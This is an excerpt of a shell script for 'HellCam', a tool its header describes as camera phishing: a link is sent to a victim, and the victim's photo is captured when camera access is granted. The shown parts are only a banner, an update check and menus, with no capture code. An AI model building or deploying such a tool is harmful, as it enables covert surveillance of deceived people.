...
# HellCam
# Version    : 1.0
# Description: HellCam is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
# Author     : HELL-MODS
# Github     : https://github.com/HELL-MODS
# Email      : thehelltechshow@gmail.com
# Credits    : HELL-MODS,Termux
# Date       : 17-10-2021
# Language   : Shell
# Portable File
...
logo="
${green}   _    _ ______ _     _         ____     _     _      _  
${red}    | |  | |  ____| |   | |      /  ___|   / \   | \    / | 
${cyan}   | |__| | |____| |   | |      | |      /   \  |  \  /  | 
${purple} |  __  |  ____| |   | |      | |     / /_\ \ | | \/ | | 
${yellow} | |  | | |____| |___| |___   | |____/ _____ \|  \__/  | 
${red}    |_|  |_|______| ____|_____|   \____/_/     \_\_|    |_|
${green}                                                        V-1.0
${blue}                                                     [By HELL-MODS]
"
...
if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
    ...
    echo -e "${info}HellCam has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
        printf "${ask}Do you want to update HellCam?${yellow}[y/n] > $green"
        read upask
        printf "$nc"
        if [[ "$upask" == "y" ]]; then
...
read option
    if echo $option | grep -q "1"; then
        ...
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[HellCam]
$red[Version]    ${cyan} :[1.0]
$red[Description]${cyan} :[Camera Phishing tool]
$red[Author]     ${cyan} :[HELL-MODS]
$red[Github]     ${cyan} :[https://github.com/HELL-MODS] 
$red[Email]      ${cyan} :[thehelltechshow@gmail.com]"
printf "${cyan}\nHell${nc}@${cyan}Cam ${red}$ ${nc}"
read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://github.com/HELL-MODS"
